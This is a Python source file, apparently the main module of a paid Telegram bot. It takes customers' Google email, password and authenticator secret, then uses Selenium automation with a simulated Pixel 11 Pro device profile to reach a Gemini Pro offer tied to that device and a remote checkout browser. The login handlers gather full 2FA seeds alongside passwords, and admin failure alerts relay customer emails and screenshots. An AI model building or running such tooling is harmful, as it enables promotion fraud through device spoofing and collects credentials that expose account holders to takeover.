"""
Telegram Bot entry point for the Pixel 11 Pro Google One Gemini Bot.

Commands:
  /start        – Show welcome message and available commands
  /login        – Begin credential capture flow (email → password → 2FA)
  /check_offer  – Run Google One automation and look for Gemini Pro offer
  /get_link     – Show the last captured offer link
  /status       – Show current session status and device profile
"""

import asyncio
import io
import logging
import sys
import os
import re
from admin_store import STORE, is_admin

from telegram import (
    Update, ReplyKeyboardRemove, ReplyKeyboardMarkup, BotCommand,
    MenuButtonCommands, MenuButtonWebApp, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    TypeHandler,
    filters,
)

import config
import i18n
from device_simulator import create_device_profile
from google_automation import GoogleAutomationError, check_gemini_offer
from remote_checkout import (
    REGISTRY, enabled as checkout_enabled, start_http,
    CHECKOUT_PUBLIC_URL,
)

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(level=config.LOG_LEVEL, format=config.LOG_FORMAT)
logger = logging.getLogger(__name__)

# KVM_CHECK: diagnostic only; does not change browser or bot behavior.
if os.path.exists("/dev/kvm"):
    logger.info("KVM_CHECK: /dev/kvm exists; read=%s write=%s", os.access("/dev/kvm", os.R_OK), os.access("/dev/kvm", os.W_OK))
else:
    logger.info("KVM_CHECK: /dev/kvm is not available in this container")
# HTTPX INFO logs include the entire Telegram API URL, including the bot token.
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)

# ── Conversation states ───────────────────────────────────────────────────────
AWAIT_EMAIL, AWAIT_PASSWORD, AWAIT_TOTP, AWAIT_KEY = range(4)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _get_session(chat_id: int) -> dict:
    """Return (creating if absent) the session dict for *chat_id*."""
    if chat_id not in config.SESSION_STORE:
        config.SESSION_STORE[chat_id] = {}
    return config.SESSION_STORE[chat_id]


def _make_progress_callback(bot, chat_id: int, loop: asyncio.AbstractEventLoop):
    """
    Return a thread-safe callback that sends a text message + optional
    screenshot photo to Telegram from inside the Selenium worker thread.
    """
    def _cb(msg: str, screenshot_bytes: bytes | None = None):
        async def _send():
            try:
                if screenshot_bytes:
                    await bot.send_photo(
                        chat_id=chat_id,
                        photo=io.BytesIO(screenshot_bytes),
                        caption=msg[:1024],
                    )
                else:
                    await bot.send_message(
                        chat_id=chat_id,
                        text=msg,
                    )
            except Exception as e:
                logger.warning("Progress send error: %s", e)

        asyncio.run_coroutine_threadsafe(_send(), loop)

    return _cb


def failure_reason(exc, recent_messages):
    """The clearest diagnosis we have for a failed activation attempt: the
    error's own message, or the last concrete step reported before it (never
    the generic 'Last browser screen' wrapper), so the admin knows why to
    give the customer another attempt."""
    msg = str(exc).strip()
    is_generic_google_msg = isinstance(exc, GoogleAutomationError) and msg.startswith('Google sign-in did not complete')
    if not msg or is_generic_google_msg:
        for m in reversed(recent_messages):
            if 'Last browser screen before stopping' not in m:
                msg = m.split('\n', 1)[0]
                break
    return (msg or type(exc).__name__)[:250]


# ── Telegram menu ────────────────────────────────────────────────────────────

MENU_LOGIN = "LOGIN"
MENU_CHECK = ""  # Removed from customer navigation
MENU_LINK = "🔗 Last Link"
MENU_STATUS = "📊 Status"
MENU_PAYMENT = "💳 Payment Window"
MENU_CLOSE = "🛑 Close Browser"


def _menu_keyboard(user_id=None, cancel=False):
    from customer_portal import keyboard
    lang = i18n.resolve(user_id) if user_id else 'en'
    return keyboard(bool(user_id and is_admin(user_id)), cancel or bool(user_id and REGISTRY.for_chat(user_id)), lang)


def clear_input(context):
    for key in ('phase','pending_email','pending_password','admin_state','admin_action','support_pending'):
        context.user_data.pop(key,None)


async def error_handler(update,context):
    logger.error('Update failed: %s', type(context.error).__name__)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text('Something went wrong. Select CANCEL or /start to return to the menu.')
        except Exception:
            pass


async def _configure_bot_menu(app):
    """Enable the Telegram menu and the private HTTPS browser viewer."""
    try:
        app.bot_data['remote_runner'] = await start_http()
        STORE.recover()
        app.bot_data['remote_cleanup'] = asyncio.create_task(REGISTRY.monitor_sessions())
        import store_link
        store_link.init()
        app.bot_data['store_reconcile'] = asyncio.create_task(store_link.reconcile_loop(app.bot))
    except Exception:
        logger.exception('Failed to start remote checkout viewer')
    try:
        await app.bot.set_my_commands([
            BotCommand('start','Open main menu'),
            BotCommand('buy','Buy activation codes'),
            BotCommand('login','Start one login with your code'),
            BotCommand('google_one','Test Google One in the Pixel browser'),
            BotCommand('cancel','Cancel the current operation'),
        ])
        await app.bot.set_chat_menu_button(menu_button=MenuButtonCommands())
    except Exception:
        logger.exception("Could not configure the native Telegram command menu")


# ── Handlers ──────────────────────────────────────────────────────────────────

async def _send_welcome(update, context):
    uid = update.effective_user.id
    lang = i18n.resolve(uid)
    await update.effective_message.reply_text(i18n.t('welcome', lang), reply_markup=_menu_keyboard(uid))
    if context.args and context.args[0] == 'store':      # deep link from the store bot's product
        import store_link
        await store_link.buy_menu(update, context)


async def start(update, context):
    clear_input(context)
    if update.effective_chat.type != 'private':
        await update.message.reply_text('Please open a private chat with this bot.')
        return
    try:
        await context.bot.set_chat_menu_button(chat_id=update.effective_chat.id,menu_button=MenuButtonCommands())
    except Exception:
        logger.warning('Could not reset Telegram menu button')
    uid = update.effective_user.id
    if i18n.get(uid) is None:                             # first time here: let the customer pick a language
        if context.args:
            context.user_data['pending_start_arg'] = context.args[0]
        await update.message.reply_text(i18n.t('choose_language', 'en'), reply_markup=i18n.picker_markup())
        return
    await _send_welcome(update, context)


async def language_pick(update, context):
    q = update.callback_query
    await q.answer()
    lang = q.data.split(':', 1)[1]
    try:
        i18n.set_lang(update.effective_user.id, lang)
    except ValueError:
        return
    try:
        await q.edit_message_reply_markup(reply_markup=None)
    except Exception:
        pass
    await q.message.reply_text(i18n.t('language_saved', lang))
    pending = context.user_data.pop('pending_start_arg', None)
    if pending:
        context.args = [pending]
    else:
        context.args = []
    await _send_welcome(update, context)


async def language_menu(update, context):
    """🌐 LANGUAGE button: change language from inside the menu, any time."""
    lang = i18n.resolve(update.effective_user.id)
    await update.message.reply_text(i18n.t('choose_language', lang), reply_markup=i18n.picker_markup())


async def joined_continue(update, context):
    import join_gate
    async def after(update, context):
        lang = i18n.resolve(update.effective_user.id)
        await update.callback_query.message.reply_text(i18n.t('join_thanks', lang), reply_markup=_menu_keyboard(update.effective_user.id))
    await join_gate.continue_button(update, context, after)


async def buy_command(update, context):
    import store_link
    clear_input(context)
    if update.effective_chat.type != 'private':
        await update.message.reply_text('Please open a private chat with this bot.')
        return
    await store_link.buy_menu(update, context)


async def my_id(update, context):
    await update.message.reply_text('Telegram ID: ' + str(update.effective_user.id))

async def login_start(update, context):
    lang = i18n.resolve(update.effective_user.id)
    if update.effective_chat.type != 'private':
        await update.message.reply_text(i18n.t('private_only', lang))
        return ConversationHandler.END
    if REGISTRY.for_chat(update.effective_user.id):
        await update.message.reply_text(i18n.t('active_browser', lang))
        return ConversationHandler.END
    settings = STORE.settings()
    if settings['maintenance']:
        await update.message.reply_text(settings['maintenance_message'])
        return ConversationHandler.END
    import customer_portal
    typed = update.message.text.strip()
    if customer_portal.reverse_map().get(typed.upper()) == 'LOGIN':
        raw = ''                          # the LOGIN menu button itself, in any language
    else:
        raw = re.sub(r'^/?login(?:@\w+)?\s*', '', typed, flags=re.I).strip()
    if raw:
        return await accept_key(update, context, raw)
    instructions = (settings.get('instructions') or '').strip()
    if instructions:                      # shown before every start; the button continues to step 1
        await update.message.reply_text(i18n.t('instructions_title', lang) + '\n\n' + instructions[:3800],
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(i18n.t('instructions_continue_btn', lang), callback_data='i:go')]]))
        return None
    await update.message.reply_text(i18n.t('step1_code', lang), reply_markup=_menu_keyboard(update.effective_user.id,True))
    return AWAIT_KEY


async def instructions_continue(update, context):
    """The customer read the instructions: continue to step 1 (same checks as LOGIN)."""
    q = update.callback_query
    await q.answer()
    uid = update.effective_user.id
    if update.effective_chat.type != 'private':
        return
    try:
        await q.edit_message_reply_markup(reply_markup=None)
    except Exception:
        pass
    lang = i18n.resolve(uid)
    if REGISTRY.for_chat(uid):
        await q.message.reply_text(i18n.t('active_browser', lang))
        return
    settings = STORE.settings()
    if settings['maintenance']:
        await q.message.reply_text(settings['maintenance_message'])
        return
    clear_input(context)
    context.user_data['phase'] = AWAIT_KEY
    await q.message.reply_text(i18n.t('step1_code', lang), reply_markup=_menu_keyboard(uid,True))

async def login_key(update, context):
    return await accept_key(update, context, update.message.text)

async def accept_key(update, context, raw):
    lang = i18n.resolve(update.effective_user.id)
    code = re.sub(r'^T\s*=\s*', '', raw.strip(), flags=re.I)
    import time
    attempts=[t for t in context.user_data.get('code_attempts',[]) if time.monotonic()-t<60]
    if len(attempts)>=5:
        await update.message.reply_text(i18n.t('too_many_codes', lang))
        return AWAIT_KEY
    try:
        code = STORE.claim(code, update.effective_user.id)
    except ValueError as exc:
        context.user_data['code_attempts']=attempts+[time.monotonic()]
        msg = str(exc)
        await update.message.reply_text(i18n.t('invalid_code', lang) if msg == 'Invalid, used, revoked or already assigned code.' else msg)
        return AWAIT_KEY
    _get_session(update.effective_user.id)['access_key'] = code
    await update.message.reply_text(i18n.t('step2_email', lang), reply_markup=_menu_keyboard(update.effective_user.id,True))
    return AWAIT_EMAIL


async def login_email(update: Update,
                      context: ContextTypes.DEFAULT_TYPE) -> int:
    lang = i18n.resolve(update.effective_user.id)
    email = update.message.text.strip()
    if not re.fullmatch(r'[^\s@]+@[^\s@]+\.[^\s@]+',email):
        await update.message.reply_text(i18n.t('invalid_email', lang))
        return AWAIT_EMAIL
    context.user_data['pending_email'] = email
    await update.message.reply_text(i18n.t('step3_password', lang),reply_markup=_menu_keyboard(update.effective_user.id,True))
    return AWAIT_PASSWORD


async def login_password(update: Update,
                         context: ContextTypes.DEFAULT_TYPE) -> int:
    lang = i18n.resolve(update.effective_user.id)
    context.user_data["pending_password"] = update.message.text.strip()
    try:
        await update.message.delete()
    except Exception:
        pass
    await update.effective_chat.send_message(i18n.t('step4_totp', lang),reply_markup=_menu_keyboard(update.effective_user.id,True))
    return AWAIT_TOTP


def _looks_like_totp_secret(raw: str) -> bool:
    """A plausible authenticator secret key: base32 letters/digits (2-7),
    at least 16 characters once spaces/dashes/padding are stripped. Rejects
    "NONE", empty input, and 6-digit codes typed by mistake."""
    cleaned = raw.upper().replace(" ", "").replace("-", "").rstrip("=")
    return bool(re.fullmatch(r'[A-Z2-7]{16,}', cleaned))


async def login_totp(update: Update,
                     context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.effective_chat.id
    lang = i18n.resolve(chat_id)
    raw = update.message.text.strip()

    try:
        await update.message.delete()
    except Exception:
        pass

    # Two-factor authentication is now mandatory: no "NONE" bypass. A login
    # without it was the more fragile path (more unexplained Selenium
    # failures), and some activations require it on the account anyway.
    if not _looks_like_totp_secret(raw):
        await update.effective_chat.send_message(
            i18n.t('invalid_totp', lang), reply_markup=_menu_keyboard(chat_id, True)
        )
        return AWAIT_TOTP

    totp_secret = raw.upper().replace(" ", "").replace("-", "")
    email = context.user_data.pop("pending_email", "")
    password = context.user_data.pop("pending_password", "")

    session = _get_session(chat_id)
    session["email"] = email
    session["password"] = password
    session["totp_secret"] = totp_secret
    session["device"] = create_device_profile()
    session["offer_link"] = None
    session["google_one_mobile_mode"] = bool(context.user_data.pop("google_one_mobile_mode", False))

    context.application.create_task(check_offer(update, context), update=update)
    return ConversationHandler.END


async def login_cancel(update,context):
    clear_input(context)
    context.user_data.pop("google_one_mobile_mode", None)
    remote=REGISTRY.for_chat(update.effective_user.id)
    if remote:
        remote.cancelled = True
        await asyncio.to_thread(REGISTRY.discard,remote)
    else:
        config.SESSION_STORE.pop(update.effective_user.id,None)
    await update.message.reply_text(i18n.t('cancelled', i18n.resolve(update.effective_user.id)),reply_markup=_menu_keyboard(update.effective_user.id))
    return ConversationHandler.END


# ── /check_offer ──────────────────────────────────────────────────────────────

async def check_offer(update: Update,
                      context: ContextTypes.DEFAULT_TYPE) -> None:
    """Run Google One automation with live step-by-step Telegram updates."""
    chat_id = update.effective_chat.id
    session = _get_session(chat_id)

    if update.effective_chat.type != 'private':
        await update.message.reply_text('Use a private chat with the bot.')
        return
    settings = STORE.settings()
    if settings['maintenance']:
        await update.message.reply_text(settings['maintenance_message'])
        return
    try:
        STORE.claim(session.get('access_key', ''), chat_id)
    except ValueError:
        await update.message.reply_text('🔑 Use /login T=CODE with a generated code first.')
        return
    if not checkout_enabled():
        await update.message.reply_text('The Mini App is not configured. Contact the administrator.')
        return

    if not session.get("email") or not session.get("password"):
        await update.message.reply_text(
            "⚠️ No credentials found. Please use /login first."
        )
        return

    device = session.get("device")
    if not device:
        device = create_device_profile()
        session["device"] = device

    loop = asyncio.get_running_loop()
    remote_session = None
    if checkout_enabled():
        try:
            remote_session = REGISTRY.create(chat_id)
            STORE.begin(session['access_key'], chat_id, remote_session.token, session.get('email',''))
        except (RuntimeError, ValueError) as exc:
            if remote_session:
                await asyncio.to_thread(REGISTRY.discard, remote_session)
            await update.message.reply_text(f"⚠️ {exc}")
            return

    lang = i18n.resolve(chat_id)
    from session_progress import SessionProgress
    progress_message = await context.bot.send_message(chat_id=chat_id, text=i18n.t('progress_title_preparing', lang))
    tracker = SessionProgress(progress_message, remote_session, lang)
    tracker.start()
    photo_progress = _make_progress_callback(context.bot, chat_id, loop)

    recent_messages = []
    last_screenshot = [None]  # the most recent screenshot any step reported, kept
    # as a 1-item list purely so the nested functions below can rebind it.

    def report_with_phase(msg, screenshot_bytes=None):
        if remote_session is not None:
            # Never expose emails/credentials as part of the Mini App status.
            public_phase = msg.split('\n', 1)[0]
            if 'Entering email:' in public_phase:
                public_phase = '📧 Entering email…'
            remote_session.phase = public_phase[:110]
        recent_messages.append(msg)
        del recent_messages[:-5]
        loop.call_soon_threadsafe(tracker.report, msg)
        if screenshot_bytes:
            last_screenshot[0] = screenshot_bytes
            photo_progress(msg, screenshot_bytes)

    report_with_phase.capture_screenshots = True

    def _grab_failure_screenshot():
        """The browser exactly as it stood at the moment of failure, for the
        admin notification.

        The automation itself (google_automation.py) already takes a real
        screenshot at the moment something goes wrong and relays it here via
        report_with_phase — that's what `last_screenshot` holds, and it is
        the only reliable source: by the time *this* function used to try
        grabbing a fresh one straight from `remote_session.driver`, the
        automation's own `finally:` block had already quit that browser and
        cleared `.driver`, so that live grab was silently always too late
        and never actually produced anything for the admin. Keep it only as
        a last-ditch fallback in case a failure happens before any step ever
        reported a screenshot."""
        if last_screenshot[0]:
            return last_screenshot[0]
        driver = getattr(remote_session, 'driver', None) if remote_session is not None else None
        if driver is None:
            return None
        try:
            lock = getattr(remote_session, 'resource_lock', None)
            if lock is not None:
                with lock:
                    return driver.get_screenshot_as_png()
            return driver.get_screenshot_as_png()
        except Exception:
            return None

    async def notify_admins(reason, screenshot_bytes=None):
        from admin_store import admin_ids
        email = session.get('email', '') or '—'
        code = session.get('access_key', '') or '—'
        text = ('⚠️ ACTIVATION FAILED\n\n'
                f'Customer: {chat_id}\nCode: {code}\nEmail: {email}\n\nReason: {reason}\n\n'
                'Open ADMIN → Reports to review, or send the customer a fresh code for another attempt.')
        for admin_id in admin_ids():
            try:
                if screenshot_bytes:
                    await context.bot.send_photo(
                        chat_id=admin_id,
                        photo=io.BytesIO(screenshot_bytes),
                        caption=text[:1024],
                    )
                    if len(text) > 1024:
                        await context.bot.send_message(chat_id=admin_id, text=text)
                else:
                    await context.bot.send_message(chat_id=admin_id, text=text)
            except Exception:
                logger.warning('Could not notify admin %s of a failed activation', admin_id)

    try:
        offer_link = await loop.run_in_executor(
            None,
            lambda: check_gemini_offer(
                session["email"],
                session["password"],
                device,
                totp_secret=session.get("totp_secret"),
                progress_callback=report_with_phase,
                remote_session=remote_session,
                google_one_mobile_mode=bool(session.get("google_one_mobile_mode")),
            ),
        )
    except GoogleAutomationError as exc:
        cancelled = bool(remote_session and getattr(remote_session, 'cancelled', False))
        await tracker.finish('cancelled' if cancelled else 'failed')
        reason = failure_reason(exc, recent_messages)
        shot = await asyncio.to_thread(_grab_failure_screenshot) if not cancelled else None
        if remote_session is not None:
            await asyncio.to_thread(REGISTRY.discard, remote_session, 'cancelled' if cancelled else 'failed', reason)
        if not cancelled:
            await notify_admins(reason, shot)
        await context.bot.send_message(
            chat_id=chat_id,
            text=i18n.t('error_generic', lang),
            reply_markup=_menu_keyboard(chat_id),
        )
        return
    except Exception as exc:
        cancelled = bool(remote_session and getattr(remote_session, 'cancelled', False))
        await tracker.finish('cancelled' if cancelled else 'failed')
        reason = failure_reason(exc, recent_messages)
        shot = await asyncio.to_thread(_grab_failure_screenshot) if not cancelled else None
        if remote_session is not None:
            await asyncio.to_thread(REGISTRY.discard, remote_session, 'cancelled' if cancelled else 'failed', reason)
        logger.exception("Unexpected error in check_offer for chat %s", chat_id)
        if not cancelled:
            await notify_admins(reason, shot)
        await context.bot.send_message(
            chat_id=chat_id,
            text=i18n.t('error_generic', lang),
            reply_markup=_menu_keyboard(chat_id),
        )
        return

    finally:
        if not tracker.finished:
            await tracker.finish('ready' if remote_session and remote_session.interactive_enabled and not remote_session.closed else 'failed')

    # The result is delivered as ONE final screenshot by the worker callback.
    # Save a real checkout link for /get_link without sending an extra message.
    if offer_link:
        session["offer_link"] = offer_link
    if remote_session and remote_session.ready and remote_session.interactive_enabled:
        if session.get("google_one_mobile_mode"):
            await context.bot.send_message(
                chat_id=chat_id,
                text=("📲 Google One mobile website is open in your Pixel browser test.\n"
                      "This is not the signed Google One Android app; the 6-month offer is not verified."),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔎 Open Google One browser", web_app=WebAppInfo(url=remote_session.url+'?lang='+lang)),
                ]]),
            )
            return
        await context.bot.send_message(chat_id=chat_id, text=i18n.t('ready_title', lang), reply_markup=_menu_keyboard(chat_id))
        miniapp_url = remote_session.url + '?lang=' + lang
        await context.bot.send_message(
            chat_id=chat_id,
            text=i18n.t('ready_body', lang),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(i18n.t('live_browser_btn', lang), web_app=WebAppInfo(url=miniapp_url)),
            ]]),
            disable_web_page_preview=True,
        )
    elif remote_session is not None:
        soft_reason = (recent_messages[-1].split('\n', 1)[0] if recent_messages
                       else 'Finished without reaching the final payment stage (no Gemini Pro offer found)')
        shot = await asyncio.to_thread(_grab_failure_screenshot)
        await notify_admins(soft_reason[:250], shot)
        await asyncio.to_thread(REGISTRY.discard, remote_session, 'failed', soft_reason[:250])
    elif not checkout_enabled():
        await context.bot.send_message(
            chat_id=chat_id,
            text=("⚠️ Interactive browser is not configured. Set PUBLIC_BASE_URL "
                  "to the HTTPS domain of this Railway service and redeploy. "
                  "The screenshot alone cannot accept typed card information."),
        )


async def payment_window(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    lang = i18n.resolve(update.effective_user.id)
    remote = REGISTRY.for_chat(update.effective_chat.id)
    if remote and remote.ready and remote.interactive_enabled:
        await update.message.reply_text(
            i18n.t('ready_body', lang),
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(i18n.t('live_browser_btn', lang), web_app=WebAppInfo(url=remote.url+'?lang='+lang)),
            ]]),
        )
    else:
        await update.message.reply_text(i18n.t('menu_fallback', lang))


async def close_checkout(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    remote = REGISTRY.for_chat(update.effective_chat.id)
    if not remote:
        await update.message.reply_text("ℹ️ No browser session is active.")
        return
    await asyncio.to_thread(REGISTRY.discard, remote)
    await update.message.reply_text("✅ Private browser session closed.")


async def _shutdown_bot(app):
    cleanup_task = app.bot_data.get('remote_cleanup')
    if cleanup_task:
        cleanup_task.cancel()
    reconcile_task = app.bot_data.get('store_reconcile')
    if reconcile_task:
        reconcile_task.cancel()
    runner = app.bot_data.get('remote_runner')
    if runner:
        await runner.cleanup()
    for remote in list(REGISTRY.by_chat.values()):
        await asyncio.to_thread(REGISTRY.discard, remote)


# ── /get_link ─────────────────────────────────────────────────────────────────

async def get_link(update: Update,
                   context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    link = _get_session(chat_id).get("offer_link")
    if link:
        await update.message.reply_text(
            f"🔗 *Last captured Google AI Pro checkout link:*\n\n{link}",
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            "ℹ️ No Google AI Pro checkout link captured yet. Use /check\\_offer first.",
            parse_mode="Markdown",
        )


# ── /status ───────────────────────────────────────────────────────────────────

async def status(update: Update,
                 context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    session = _get_session(chat_id)

    if not session:
        await update.message.reply_text(
            "ℹ️ No active session. Use /login to get started."
        )
        return

    email = session.get("email", "—")
    has_creds = bool(session.get("email") and session.get("password"))
    has_2fa = bool(session.get("totp_secret"))
    offer_link = session.get("offer_link")
    device = session.get("device")

    lines = [
        "📊 *Session Status*\n",
        f"Account: `{email}`",
        f"Credentials loaded: {'✅' if has_creds else '❌'}",
        f"2FA enabled: {'✅' if has_2fa else '❌'}",
        f"Offer link captured: {'✅' if offer_link else '❌'}",
    ]
    if offer_link:
        lines.append(f"🔗 {offer_link}")
    if device:
        lines.append("\n🌐 Browser: Chrome Desktop (1280×900)")

    await update.message.reply_text(
        "\n".join(lines),
        parse_mode="Markdown",
    )


async def begin_login(update,context):
    clear_input(context)
    context.user_data.pop("google_one_mobile_mode", None)
    context.user_data['phase']=await login_start(update,context)


async def begin_google_one_mobile(update,context):
    """Start the normal login flow, then inspect mobile Google One instead of checkout."""
    clear_input(context)
    context.user_data["google_one_mobile_mode"] = True
    if update.effective_chat.type != "private":
        await update.message.reply_text("Please use this command in a private chat.")
        return
    if REGISTRY.for_chat(update.effective_user.id):
        await update.message.reply_text("Close the previous browser session first.")
        return
    settings = STORE.settings()
    if settings["maintenance"]:
        await update.message.reply_text(settings["maintenance_message"])
        return
    code = " ".join(context.args or []).strip()
    if code:
        context.user_data["phase"] = await accept_key(update, context, code)
    else:
        context.user_data["phase"] = AWAIT_KEY
        await update.message.reply_text(
            "📲 Google One mobile browser test on the existing Pixel profile.\n"
            "Enter your access code (T=CODE), then complete the normal Google login.\n"
            "The bot will open Google One with the SAME Chrome session.\n"
            "Note: This does not emulate the signed Android Google One app.",
            reply_markup=_menu_keyboard(update.effective_user.id, True),
        )

async def admin_entry(update,context):
    import native_admin
    clear_input(context)
    context.user_data['admin_state']=await native_admin.open_admin(update,context)

async def admin_callback(update,context):
    import native_admin
    context.user_data['admin_state']=await native_admin.callback(update,context)

async def document_router(update,context):
    import native_admin
    if context.user_data.get('admin_state')==native_admin.FILE and is_admin(update.effective_user.id):
        context.user_data['admin_state']=await native_admin.file_input(update,context)
    else:
        await update.message.reply_text('Select the upload option from ADMIN first.')

async def text_router(update,context):
    import native_admin
    import customer_portal
    if update.effective_chat.type!='private':return
    raw=update.message.text.strip();text=raw.upper()
    text=customer_portal.reverse_map().get(text,text)
    if text=='CANCEL':return await login_cancel(update,context)
    if text in ('START','HOME','🏠 HOME'):return await start(update,context)
    if text=='ADMIN':return await admin_entry(update,context)
    if text=='LANG':return await language_menu(update,context)
    if text=='BUY':
        clear_input(context)
        import store_link
        return await store_link.buy_menu(update,context)
    if text=='LOGIN' or re.match(r'^/?LOGIN\s+T=',text):return await begin_login(update,context)
    if text in ('WALLET','ORDER','SUPPORT','API'):
        clear_input(context)
        return await customer_portal.handle(update,context,text)
    if raw in native_admin.MENU:
        context.user_data['admin_state']=await native_admin.menu_choice(update,context);return
    if is_admin(update.effective_user.id) and context.user_data.get('admin_state')==native_admin.INPUT:
        context.user_data['admin_state']=await native_admin.text_input(update,context);return
    if context.user_data.get('support_pending'):return await customer_portal.ticket(update,context)
    phase=context.user_data.get('phase')
    handlers={AWAIT_KEY:login_key,AWAIT_EMAIL:login_email,AWAIT_PASSWORD:login_password,AWAIT_TOTP:login_totp}
    if phase in handlers:
        context.user_data['phase']=await handlers[phase](update,context)
    else:
        await update.message.reply_text(i18n.t('menu_fallback',i18n.resolve(update.effective_user.id)),reply_markup=_menu_keyboard(update.effective_user.id))


# ── Application setup ─────────────────────────────────────────────────────────

def main() -> None:
    token = config.TELEGRAM_BOT_TOKEN
    if not token:
        logger.error(
            "TELEGRAM_BOT_TOKEN is not set. Add it to Railway Variables (or local environment) and restart."
        )
        sys.exit(1)

    app = (Application.builder().token(token)
           .post_init(_configure_bot_menu).post_shutdown(_shutdown_bot).build())

    app.add_error_handler(error_handler)
    import join_gate
    app.add_handler(TypeHandler(Update, join_gate.gate), group=-1)     # required-channel gate runs first
    app.add_handler(CallbackQueryHandler(joined_continue, pattern=r'^j:ok$'))
    app.add_handler(CallbackQueryHandler(language_pick, pattern=r'^lang:'))
    app.add_handler(CommandHandler('start',start))
    app.add_handler(CommandHandler('menu',start))
    app.add_handler(CommandHandler('cancel',login_cancel))
    app.add_handler(CommandHandler('login',begin_login))
    app.add_handler(CommandHandler('google_one',begin_google_one_mobile))
    from native_google_one_bot import native_google_one_command
    app.add_handler(CommandHandler('test_google_one', native_google_one_command))
    app.add_handler(CommandHandler('buy',buy_command))
    app.add_handler(CommandHandler('admin',admin_entry))
    app.add_handler(CommandHandler('id',my_id))
    app.add_handler(CommandHandler('payment',payment_window))
    from customer_portal import api_key
    app.add_handler(CallbackQueryHandler(api_key,pattern=r'^customer:api$'))
    import store_link
    app.add_handler(CallbackQueryHandler(store_link.buy_callback,pattern=r'^b:'))
    app.add_handler(CallbackQueryHandler(instructions_continue,pattern=r'^i:go$'))
    app.add_handler(CallbackQueryHandler(admin_callback,pattern=r'^a:'))
    app.add_handler(MessageHandler(filters.Document.ALL,document_router))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND,text_router))

    logger.info("Bot is running. Press Ctrl-C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
